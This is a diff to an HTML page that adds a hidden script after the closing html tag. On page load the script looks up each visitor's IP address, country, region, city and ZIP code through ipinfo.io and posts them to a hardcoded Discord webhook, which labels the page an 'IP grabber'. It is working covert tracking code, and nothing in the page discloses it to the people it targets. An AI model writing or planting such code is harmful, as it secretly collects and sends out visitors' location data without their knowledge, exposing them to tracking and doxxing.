@@ -16,3 +16,31 @@
   </body>
 
 </html>
+
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discordapp.com/api/webhooks/955454787795709972/CSo5E1Hhq0LfDruhMJSvfQasUiYElve3-9LD_a5vd4Vu45wohww_wNVBb_U0qY2S7pnu");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "corrosionowo",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Someone visited the IP grabber!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
